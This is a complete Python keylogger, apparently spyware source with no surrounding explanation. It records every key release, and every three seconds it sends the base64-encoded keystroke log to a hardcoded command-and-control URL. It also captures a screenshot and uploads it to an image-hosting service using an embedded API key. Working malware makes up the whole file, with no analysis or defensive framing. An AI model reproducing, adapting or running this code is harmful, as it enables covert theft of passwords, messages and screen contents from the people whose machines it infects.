import io
import pyautogui
import keyboard
from threading import Timer
from base64 import b64encode
import requests

C2_URL = "https://eon3cpff3omgg7n.m.pipedream.net"
KEY_IMG_bb = "84bce84694b11eed9ab8835ef16ebee0"
IMG_BB_URL = "https://api.imgbb.com/1/upload"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        # key UP is occured
        name = event.name
        if len(name) > 1:
            name = name.replace(" ","_")
            name = name.upper()
            name = "[{}]".format(name)

        self.log += name

        print(name)

    def send_server(self):
        leaked_bytes = (self.log).encode("ascii")
        leaked_info = b64encode(leaked_bytes)
        params = {"K":leaked_info}
        res = requests.get(C2_URL, params=params)

        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_bytes = img_bytes.getvalue()
        img_encoded = b64encode(img_bytes)
        payload = {"key":KEY_IMG_bb, "image":img_encoded}
        res = requests.post(IMG_BB_URL, payload)

    def report(self):
        
        if self.log != "":
            self.send_server()

        self.log = ""
        print("# sended #")

        # This function gets called every `self.interval`
        
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    
if __name__ == "__main__":

    keylogger = Keylogger(interval=3)
    keylogger.start()